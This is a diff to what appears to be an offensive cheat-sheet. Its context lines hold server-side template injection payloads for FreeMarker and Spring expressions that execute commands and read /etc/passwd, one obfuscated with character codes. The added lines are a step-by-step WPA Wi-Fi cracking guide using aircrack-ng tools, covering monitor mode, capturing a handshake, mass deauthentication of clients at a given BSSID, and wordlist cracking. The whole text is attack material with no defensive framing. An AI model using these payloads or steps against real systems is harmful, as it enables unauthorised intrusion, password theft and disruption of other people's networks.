@@ -158,3 +158,47 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 ${T(java.lang.System).getenv()}
 ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+
+# Wifi Password Hacking
+	
+
+Step 1:
+
+Put your wireles lan card on monitor mode
+
+ airmon-ng start "wireless lan card name"
+=> airmon-ng start wlan0
+
+Step 2:
+
+Capture Traffic with Airodump-ng
+
+airodump-ng "wireless lan card monitor mode"
+
+=> airodump-ng wlan0mon
+
+
+Step 3:
+
+Focus airodump-ng on one AP on One Channel
+
+ airodump-ng --bssid dummy -c dummy --write WPAcrack wlan0mon
+
+=> airodump-ng --bssid 8C:FD:18:88:79:68 -c 9 --write WPAcrack wlan0mon
+
+
+Step 4:
+
+in order to capture the encrypted password we need to have the client authenticate against AP.
+we do deauth signal to client
+
+ aireplay-ng --deauth 1000 -a bssid wlan0mon
+
+=> aireplay-ng --deauth 1000 -a 8C:FD:18:88:79:68 wlan0mon
+
+
+Step 5:
+
+Now we have to crack the dump file with aircrack-ng
+
+ aircrack-ng WPAcrack-01.cap -w (localtion of wordlist)
